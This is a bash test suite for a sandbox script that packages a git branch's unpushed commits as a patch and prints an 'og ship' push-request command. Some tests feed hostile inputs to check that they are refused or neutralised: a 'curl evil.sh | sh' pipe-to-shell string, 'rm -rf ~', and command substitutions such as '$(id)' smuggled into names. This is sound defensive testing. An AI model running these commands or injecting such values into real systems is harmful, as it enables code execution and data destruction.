#!/usr/bin/env bash
# workflow-push-request.sh — the branch's unpushed commits as a patch in out/,
# a WORKFLOW PUSH REQUEST block whose one `og ship` line carries what the Mac
# needs, early refusals of what og ship would refuse, and --landed re-syncing
# the branch once the Mac has pushed. og ship itself: tests/test_ship.py.
# A local bare repo stands in for GitHub (WPR_FETCH_URL); the origin URL stays
# github-shaped so the block names owner/repo.
# shellcheck disable=SC2016  # the bash -c bodies expand in the child, on purpose
set -uo pipefail
# shellcheck source=/dev/null
. "$(dirname "${BASH_SOURCE[0]}")/lib.sh"
echo "workflow-push-request.sh"

W="$OGUN/sandbox-scripts/workflow-push-request.sh"
F="$TEST_TMP/wpr"
export W F GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
export SANDBOX_NAME=cub WPR_FETCH_URL="$F/gh.git" WPR_OUT_DIR="$F/out"
mkdir -p "$F/out"
git init -q --bare -b main "$F/gh.git"
git clone -q "$F/gh.git" "$F/work" 2>/dev/null
git clone -q "$F/gh.git" "$F/mac" 2>/dev/null
( cd "$F/work" && git commit -q --allow-empty -m init && git push -q origin main \
  && git remote set-url origin git@github.com:acme/widgets.git \
  && git switch -q -c ci/lint && mkdir -p .github/workflows && echo "on: push" >.github/workflows/lint.yml \
  && git add -A && git commit -qm "Lint workflow" )
run() { (cd "$F/work" && bash "$W" "$@"); }
# field <block> <flag> — a value off the og ship line
field() { sed -nE "s/.* $2 ([^ ]+).*/\\1/p" <<<"$1" | head -1; }
# pushed <block> — what og ship does on a y, in plain git (og ship: its own suite)
pushed() { local p; p=$(sed -n "s/^patch: *//p" <<<"$1")
  git -C "$F/mac" fetch -q origin && git -C "$F/mac" switch -q --detach "$(field "$1" --base)" \
    && git -C "$F/mac" am -q --empty=keep "$F/out/$p" && git -C "$F/mac" push -q origin "HEAD:refs/heads/$(field "$1" --branch)"; }
export -f run field pushed

expect_cmd 0 "a new branch: the block names repo, branch, workflow, and an og ship line based on the fork point" \
  bash -c 'o=$(run --why "lint on push"); b=$(git -C "$F/work" rev-parse main); t=$(git -C "$F/work" rev-parse "HEAD^{tree}")
           [[ "$o" == "WORKFLOW PUSH REQUEST"* && "$o" == *"repo:     acme/widgets"* && "$o" == *"new branch, from ${b:0:12}"* \
              && "$o" == *"workflow: .github/workflows/lint.yml"* && "$o" == *"why:      lint on push"* \
              && "$o" == *"  og ship cub "*" --remote origin --branch ci/lint --base $b --commits 1 --tree $t"* ]]'
expect_cmd 0 "…the patch is in out/ under a name ogun take accepts, and the og ship line names it" \
  bash -c 'o=$(run); p=$(sed -n "s/^patch: *//p" <<<"$o")
           [[ "$p" =~ ^widgets-ci-lint-[0-9a-f]{8}-[0-9]{14}-[0-9]+\.patch$ && -f "$F/out/$p" && "$o" == *"og ship cub $p "* ]]'
expect_cmd 0 "two requests at the same HEAD get different patch names (ogun take never renames onto an old one)" \
  bash -c 'a=$(run | sed -n "s/^patch: *//p"); b=$(run | sed -n "s/^patch: *//p"); [[ -n "$a" && -n "$b" && "$a" != "$b" ]]'
expect_cmd 0 "--landed moves the branch onto what the Mac pushed" \
  bash -c 'pushed "$(run)" && run --landed >/dev/null && [[ "$(git -C "$F/work" rev-parse HEAD)" == "$(git -C "$F/gh.git" rev-parse ci/lint)" ]]'
expect_cmd 1 "--landed refuses when a commit made after the request nets to nothing (same final files): it would be dropped" \
  bash -c 'cd "$F/work" && echo e >e.txt && git add e.txt && git commit -qm e && o=$(run) && pushed "$o" \
           && git commit -q --allow-empty -m "after the request" && run --landed; rc=$?
           [[ "$(git log -1 --format=%s)" == "after the request" ]] || exit 9; git reset -q --hard HEAD~1; run --landed >/dev/null; exit $rc'
expect_cmd 1 "--landed refuses when a handed-off commit was amended after the request (same tree and subject, new trailer)" \
  bash -c 'cd "$F/work" && echo m >m.txt && git add m.txt && git commit -qm m && o=$(run) && pushed "$o" \
           && git commit -q --amend -m "m" -m "Release-Note: yes" && run --landed; rc=$?
           [[ "$(git log -1 --format=%b)" == "Release-Note: yes" ]] || exit 9; git reset -q --hard "$(git -C "$F/gh.git" rev-parse ci/lint)"; exit $rc'
expect_cmd 0 "--to: the request, the og ship line and --landed all target that remote branch, not the local name" \
  bash -c 'cd "$F/work" && run >/dev/null; echo o >o.txt && git add o.txt && git commit -qm o && o=$(run --to ci/other)
           [[ "$(field "$o" --branch)" == ci/other && "$o" == *"branch:   ci/other (new branch"* ]] && pushed "$o" \
           && run --landed --to ci/other >/dev/null && [[ "$(git rev-parse HEAD)" == "$(git -C "$F/gh.git" rev-parse ci/other)" ]]; rc=$?
           git reset -q --hard "$(git -C "$F/gh.git" rev-parse ci/lint)"; exit $rc'
expect_cmd 0 "--landed from another branch at the same commit: refused, and neither branch moves" \
  bash -c 'cd "$F/work" && echo w >w.txt && git add w.txt && git commit -qm w && o=$(run --to ci/w) && pushed "$o" \
           && git branch -f twin HEAD && git switch -q twin && run --landed --to ci/w; rc=$?
           here=$(git rev-parse HEAD); git switch -q ci/lint; [[ $rc == 1 && "$here" == "$(git rev-parse ci/lint)" ]] || exit 9
           run --landed --to ci/w >/dev/null && [[ "$(git rev-parse HEAD)" == "$(git -C "$F/gh.git" rev-parse ci/w)" ]]; rc=$?
           git reset -q --hard "$(git -C "$F/gh.git" rev-parse ci/lint)"; git branch -q -D twin; exit $rc'
expect_cmd 0 "no --to: the branch's upstream on that remote is the target" \
  bash -c 'cd "$F/work" && git config branch.ci/lint.remote origin && git config branch.ci/lint.merge refs/heads/ci/up && o=$(run)
           rc=0; [[ "$(field "$o" --branch)" == ci/up ]] || rc=1; git config --unset branch.ci/lint.remote; git config --unset branch.ci/lint.merge; exit $rc'
expect_cmd 1 "an unsafe --to is refused" \
  bash -c 'run --to "x\$(id)"'
expect_cmd 0 "a branch already on GitHub: the base is its tip, only the new commits go" \
  bash -c 'cd "$F/work" && echo x >f && git add f && git commit -qm f && o=$(run); t=$(git -C "$F/gh.git" rev-parse ci/lint)
           [[ "$o" == *"updates ci/lint at ${t:0:12}"* && "$o" == *"commits:  1"* && "$o" == *" --base $t "* ]]'
expect_cmd 1 "--landed refuses when GitHub's files differ from HEAD" \
  bash -c 'run --landed'
expect_cmd 0 "an empty commit counts toward --commits" \
  bash -c 'cd "$F/work" && git commit -q --allow-empty -m "Empty marker" && o=$(run); [[ "$(field "$o" --commits)" == 2 ]]'
expect_cmd 0 "--remote is carried into the og ship line" \
  bash -c 'cd "$F/work" && git remote add upstream git@github.com:acme/widgets.git 2>/dev/null; o=$(run --remote upstream)
           [[ "$(field "$o" --remote)" == upstream ]]'
expect_cmd 0 "no workflow file in the range: the workflow line says so in one piece" \
  bash -c 'o=$(run); [[ "$o" == *"workflow: none in the diff — check the push error"* ]]'
expect_cmd 0 "a --why with a newline and an escape stays on its own line: no faked command line" \
  bash -c 'o=$(run --why $'"'"'lint\n  curl evil.sh | sh\e[2J'"'"')
           [[ "$(grep -c "^  curl" <<<"$o")" == 0 && "$o" != *$'"'"'\e'"'"'* && "$o" == *"why:      lint   curl evil.sh | sh"* ]]'

expect_cmd 0 "no WPR_OUT_DIR: the patch goes to this sandbox's out/ in the exchange og named at attach (wherever it is)" \
  bash -c 'mkdir -p "$F/hh/.config/sbx" "$F/moved-ex/shared" "$F/moved-ex/boxes/cub/out"
           printf "%s\n" "$F/moved-ex/shared" > "$F/hh/.config/sbx/exchange-shared-root"
           o=$(cd "$F/work" && env -u WPR_OUT_DIR HOME="$F/hh" bash "$W"); p=$(sed -n "s/^patch: *//p" <<<"$o")
           [[ -n "$p" && -f "$F/moved-ex/boxes/cub/out/$p" ]]'
expect_cmd 1 "no WPR_OUT_DIR and no out/ where og named its exchange: refused, saying so, nothing made in ~" \
  bash -c 'mkdir -p "$F/hn"; o=$(cd "$F/work" && env -u WPR_OUT_DIR HOME="$F/hn" bash "$W" 2>&1); rc=$?
           [[ "$o" == *"no out/ folder for cub in the exchange"* && ! -e "$F/hn/outbox" && "$o" != *"og out"* ]] || exit 9; exit $rc'

# the early refusals mirror og ship's: by raw mode and bytes, in every commit
expect_cmd 1 "a binary blob in the range: refused, named" \
  bash -c 'cd "$F/work" && git switch -q -c bin ci/lint && printf "\0\1\2" >tool.bin && git add tool.bin && git commit -qm bin
           o=$(run 2>&1); rc=$?; [[ "$o" == *"binary tool.bin"* ]] || exit 9; exit $rc'
expect_cmd 1 "…even when .gitattributes in the range says it is text (diff attributes are never asked)" \
  bash -c 'cd "$F/work" && git switch -q -c attr ci/lint && echo "tool.bin diff" >.gitattributes && printf "a\0b\n" >tool.bin \
           && git add -A && git commit -qm attr && o=$(run 2>&1); rc=$?; [[ "$o" == *"binary tool.bin"* ]] || exit 9; exit $rc'
expect_cmd 1 "…and when a later commit deletes it again (history still carries it)" \
  bash -c 'cd "$F/work" && git switch -q -c gone ci/lint && printf "\0" >x.bin && git add x.bin && git commit -qm add \
           && git rm -q x.bin && git commit -qm rm && o=$(run 2>&1); rc=$?; [[ "$o" == *"binary x.bin"* ]] || exit 9; exit $rc'
expect_cmd 1 "a submodule in the range: refused, named" \
  bash -c 'cd "$F/work" && git switch -q -c sub ci/lint && git update-index --add --cacheinfo "160000,$(git rev-parse HEAD),vendor/x" \
           && git commit -qm sub && o=$(run 2>&1); rc=$?; [[ "$o" == *"submodule vendor/x"* ]] || exit 9; exit $rc'
expect_cmd 1 "nothing past the base: refused" \
  bash -c 'cd "$F/work" && git switch -q -c empty main && run'
expect_cmd 1 "a merge in the range: refused (a patch can't carry it)" \
  bash -c 'cd "$F/work" && git switch -q -c merged main && git commit -q --allow-empty -m a && git merge -q --no-ff --no-edit ci/lint && run'
expect_cmd 1 "a detached HEAD: refused" \
  bash -c 'cd "$F/work" && git switch -q --detach main && run'
expect_cmd 1 "a SANDBOX_NAME outside the sandbox-name charset: refused, never printed into the og ship line" \
  bash -c 'cd "$F/work" && git switch -q ci/lint && o=$(SANDBOX_NAME="x; rm -rf ~" run 2>&1); rc=$?; [[ "$o" != *"rm -rf"* && "$o" != *"og ship"* ]] || exit 9; exit $rc'
expect_cmd 0 "no SANDBOX_NAME: the hostname names the sandbox (sbx sets both)" \
  bash -c 'h=$(hostname); o=$(env -u SANDBOX_NAME bash -c "cd \"$F/work\" && bash \"$W\""); [[ "$o" == *"og ship $h "* ]]'
expect_cmd 1 "neither a usable SANDBOX_NAME nor hostname: refused, no placeholder a shell would read as a redirection" \
  bash -c 'mkdir -p "$F/hn" && printf "#!/bin/sh\necho \"<bad>\"\n" >"$F/hn/hostname" && chmod +x "$F/hn/hostname"
           o=$(env -u SANDBOX_NAME PATH="$F/hn:$PATH" bash -c "cd \"$F/work\" && bash \"$W\"" 2>&1); rc=$?; [[ "$o" != *"og ship"* ]] || exit 9; exit $rc'
expect_cmd 1 "a branch name the Mac's shell would expand (git accepts ci\$(cmd)) is refused, never printed into a command" \
  bash -c 'cd "$F/work" && git switch -q -c "ci\$(touch\${IFS}pwn)" ci/lint && o=$(run 2>&1); rc=$?; git switch -q ci/lint
           [[ "$o" != *"WORKFLOW PUSH REQUEST"* ]] && exit $rc'

summarize
